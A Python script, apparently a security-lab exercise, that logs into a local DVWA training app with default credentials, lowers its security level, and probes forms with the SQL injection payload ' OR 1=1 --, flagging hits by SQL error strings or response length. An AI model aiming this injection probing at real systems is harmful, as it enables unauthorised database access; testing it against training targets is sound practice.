import requests
import json
import os
from bs4 import BeautifulSoup

# ---------------- PATH CONFIG ---------------- #

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SCANNER_OUTPUT = os.path.join(BASE_DIR, "..", "Week-2", "output.json")
RESULT_FILE = os.path.join(BASE_DIR, "sqli_results.json")

BASE_URL = "http://localhost/dvwa/"
LOGIN_URL = BASE_URL + "login.php"

session = requests.Session()


# ---------------- LOGIN FUNCTION ---------------- #

def login_dvwa():
    print("[+] Logging into DVWA for SQL testing...")

    response = session.get(LOGIN_URL)
    soup = BeautifulSoup(response.text, "html.parser")

    token_input = soup.find("input", {"name": "user_token"})
    user_token = token_input["value"] if token_input else ""

    login_data = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": user_token
    }

    session.post(LOGIN_URL, data=login_data)
    print("[+] Login successful.")

    # ---- Force Security Level LOW ----
    security_url = BASE_URL + "security.php"

    sec_page = session.get(security_url)
    soup = BeautifulSoup(sec_page.text, "html.parser")

    token_input = soup.find("input", {"name": "user_token"})
    sec_token = token_input["value"] if token_input else ""

    security_data = {
        "security": "low",
        "seclev_submit": "Submit",
        "user_token": sec_token
    }

    session.post(security_url, data=security_data)
    print("[+] Security level set to LOW.")


# ---------------- LOAD FORMS ---------------- #

def load_forms():
    if not os.path.exists(SCANNER_OUTPUT):
        print("[!] Scanner output.json not found.")
        return None

    with open(SCANNER_OUTPUT, "r") as f:
        data = json.load(f)

    return data.get("forms", [])


# ---------------- SQL INJECTION TEST ---------------- #

def test_sqli(forms):
    vulnerable = []

    print("\n[+] Starting SQL Injection Testing...\n")

    for form in forms:

        action = form["action"]
        method = form["method"]
        inputs = form["inputs"]

        input_names = [inp.get("name") for inp in inputs if inp.get("name")]

        # Only test forms that contain 'id'
        if "id" not in input_names:
            continue

        print(f"[*] Testing {action}")

        try:
            # ---- Get fresh CSRF token ----
            page_response = session.get(action)
            soup = BeautifulSoup(page_response.text, "html.parser")

            token_input = soup.find("input", {"name": "user_token"})
            user_token = token_input["value"] if token_input else ""

            # ---- Normal request ----
            normal_response = session.get(
                action,
                params={
                    "id": "1",
                    "Submit": "Submit",
                    "user_token": user_token
                }
            ).text

            # ---- Injected request ----
            injected_response = session.get(
                action,
                params={
                    "id": "' OR 1=1 --",
                    "Submit": "Submit",
                    "user_token": user_token
                }
            ).text

            normal_text = normal_response.lower()
            injected_text = injected_response.lower()

            # ---- Error-based detection ----
            sql_errors = [
                "you have an error in your sql syntax",
                "mysqli_sql_exception",
                "fatal error",
                "warning: mysqli"
            ]

            for error in sql_errors:
                if error in injected_text:
                    print(f"[!] SQL Injection Detected (Error-Based) at {action}")

                    vulnerable.append({
                        "url": action,
                        "method": method.upper(),
                        "payload": "' OR 1=1 --",
                        "type": "SQL Injection",
                        "severity": "High"
                    })
                    return vulnerable  # stop after detection

            # ---- Length-based detection (backup) ----
            if len(injected_text) > len(normal_text) + 20:
                print(f"[!] SQL Injection Detected (Length Change) at {action}")

                vulnerable.append({
                    "url": action,
                    "method": method.upper(),
                    "payload": "' OR 1=1 --",
                    "type": "SQL Injection",
                    "severity": "High"
                })

        except Exception as e:
            print(f"[!] Error testing {action}: {e}")
            continue

    return vulnerable


# ---------------- MAIN ---------------- #

if __name__ == "__main__":

    login_dvwa()

    forms = load_forms()
    if forms is None:
        exit()

    results = test_sqli(forms)

    with open(RESULT_FILE, "w") as rf:
        json.dump({"vulnerabilities": results}, rf, indent=4)

    print("\nSQL Injection Testing Completed ✅")
    print(f"Total Vulnerabilities Found: {len(results)}")
